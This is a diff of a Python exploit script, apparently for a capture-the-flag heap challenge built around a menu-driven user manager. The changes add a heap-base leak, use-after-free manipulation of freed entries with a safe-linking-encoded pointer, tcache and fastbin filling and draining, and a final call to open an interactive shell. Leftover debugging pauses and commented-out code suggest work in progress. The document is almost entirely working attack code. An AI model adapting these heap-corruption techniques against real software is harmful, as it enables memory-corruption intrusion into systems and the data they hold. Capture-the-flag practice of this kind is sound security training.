@@ -29,24 +29,44 @@ def unwrap(x):
 def main():
     io = connect()
 
-    def new(username: bytes | str, password: bytes| str):
+    def restart_alt():
+        io.sendlineafter("> ", "0")
+        return
+
+    def restart():
+        io.sendlineafter("> ", "1")
+        return
+
+    def new(username: bytes | str, password: bytes | str):
         io.sendlineafter("> ", "2")
-        io.sendlineafter("username > ", username)
-        io.sendlineafter("password > ", password)
+        if len(username) == 8:
+            io.sendafter("username > ", username)
+        else:
+            io.sendlineafter("username > ", username)
+        if len(username) == 8:
+            io.sendafter("password > ", password)
+        else:
+            io.sendlineafter("password > ", password)
         return
 
     def delete(username: bytes | str):
         io.sendlineafter("> ", "3")
         if len(username) == 8:
             io.sendafter("username > ", username)
-        else :
+        else:
             io.sendlineafter("username > ", username)
         return
 
     def change(username: bytes | str, password: bytes | str):
         io.sendlineafter("> ", "4")
-        io.sendlineafter("username > ", username)
-        io.sendlineafter("password > ", password)
+        if len(username) == 8:
+            io.sendafter("username > ", username)
+        else:
+            io.sendlineafter("username > ", username)
+        if len(username) == 8:
+            io.sendafter("password > ", password)
+        else:
+            io.sendlineafter("password > ", password)
         return
 
     def view() -> bytes:
@@ -56,39 +76,42 @@ def main():
     new("A", "BBBBBBBB")
     heap_base = ptr.u64(view().split(b"A: BBBBBBBB")[1].split(b"\nroot")[0])
     heap_base = heap_base >> 12 << 12
-    print(f'heap_base = {hex(heap_base)}')
-
-    new("B", "C")
-    new("C", "D")
+    print(f"heap_base = {hex(heap_base)}")
 
     delete("A")
-    delete("B")
-    delete("C")
-    input(">>")
-    delete(ptr.p64(heap_base >> 12))
+    delete("root")
+    change(ptr.p64(heap_base >> 12), "hello?")
 
-    # print(hex(heap_base >> 12))
+    for i in range(10):
+        restart()
 
+    new("A" * 8, "B" * 8)
+    for i in range(6):
+        new(ptr.p64(i), "pass")
+        continue
+    new("fast1", "bins")
+    new("fast2", "bins")
+    new("fast3", "bins")
+    new("fast4", "bins")
+    for i in range(7):
+        delete(ptr.p64(6 - i))
+        continue
 
+    delete("fast1")
+    delete("fast2")
+    delete("fast3")
+    delete("fast4")
 
-    # new("B", "CCCCCCCC")
-    # delete("A")
-    # print("hello")
-    # print(view())
-    # delete("A")
-    # delete(ptr.p64(heap_base >> 12))
+    for i in range(7):
+        new(ptr.p64(i), "pass")
 
-
-    # malloc_num = 7 + 10
-    # for i in range(malloc_num):
-    #     new(chr(0x42 + i), "pass")
-    #     continue
-    # for i in range(malloc_num):
-    #     delete(chr(0x42 + malloc_num - 1 - i))
-    #     continue
-
-    # input(">>")
     io.sh()
+    # restart_alt()
+
+    # new("fast4", "bins")
+    # print(view())
+    input(">>")
+
     return
 
 
